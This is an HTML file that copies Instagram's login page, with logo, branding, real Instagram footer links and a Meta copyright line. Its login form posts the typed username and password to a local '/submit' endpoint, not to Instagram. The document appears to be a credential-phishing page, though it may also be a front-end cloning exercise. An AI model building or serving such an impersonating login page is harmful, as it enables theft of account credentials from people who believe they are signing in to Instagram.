<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" />
    <link rel="stylesheet" href="./static/style.css">
</head>
<body>

    <div id="container">
        <section>
            <div class="main-top">
                <form action="/submit" method="post">
                    <div class="logo">
                        <img src="../Images/logo.png" alt="Instagram logo">
                    </div>
                    <div>
                        <input type="text" name="username" placeholder="Phone number or username" class="username" />
                        <div>
                            <input type="password" name="password" placeholder="Password" class="password" />
                        </div>
                        <button type="submit"><a><input type="button" value="Log in" class="login-btn" /></a></button>
                    </div>
                    <span class="or"> OR </span>

                    <div class="main-bottom">
                        <a href="https://www.facebook.com/login.php" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook</a><br>
                        <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forget">Forgot password</a>
                    </div>
                </form>

            </div>
            <div class="bottom">
                <div class="signUp">
                    Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                </div>
            </div>
            <div class="app-section">
                <span>Get the app</span>
                <div class="images">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DDFC2E0E7-5E56-4B64-BBB3-F43E147A2393%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%3A%2F%2Fwww.google.com%2F"><img src="../Images/googlePlay.png" alt="Google Play Image"></a>
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1439%2C766&hl=en"><img src="../Images/microsoft.png" alt="Microsoft Image"></a>
                </div>
            </div>
        </section>

        <!-- Footer Section Starts from Here -->
        <footer>
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.instagram.com/blog/">Blog</a>
            <a href="https://www.instagram.com/about/jobs/?hl=en">Jobs</a>
            <a href="https://help.instagram.com/">Help</a>
            <a href="https://developers.facebook.com/docs/instagram">API</a>
            <a href="https://www.instagram.com/legal/privacy/?hl=en">Privacy</a>
            <a href="https://www.instagram.com/legal/terms/?hl=en">Terms</a>
            <a href="https://www.instagram.com/explore/locations/?hl=en">Locations</a>
            <a href="https://www.instagram.com/web/lite/?hl=en">Instagram Lite</a>
            <a href="https://www.threads.net/">Threads</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628?hl=en">Uploading & Non-Users</a>
            <div class="bottom-footer">
                <select name="" id="">
                    <option value="English">English</option>
                    <option value="Hindi">Hindi</option>
                    <option value="Punjabi">Punjabi</option>
                    <option value="Urdu">Urdu</option>
                    <option value="Francais">Francais</option>
                </select>
                <span> &copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
    </div>

</body>
</html>
